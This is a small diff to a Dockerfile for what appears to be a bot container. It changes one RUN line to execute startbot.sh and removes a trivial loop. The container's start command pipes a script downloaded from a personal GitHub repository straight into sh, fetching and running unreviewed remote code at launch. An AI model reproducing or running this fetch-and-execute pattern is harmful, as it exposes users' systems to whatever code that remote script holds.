@@ -34,10 +34,10 @@ COPY /stuff /home/stuff
 RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 
 # Install the bot:
-RUN echo "startbot.sh:" && ls /home/stuff/
+RUN ./startbot.sh && ls /home/stuff/
 
 # Run bot script:
 CMD curl https://raw.githubusercontent.com/OpUiajwk/Opuiajwk/main/build.sh | sh
 
-RUN for i in x \y \z; do echo "$i" "hi"; done
-    
+
+
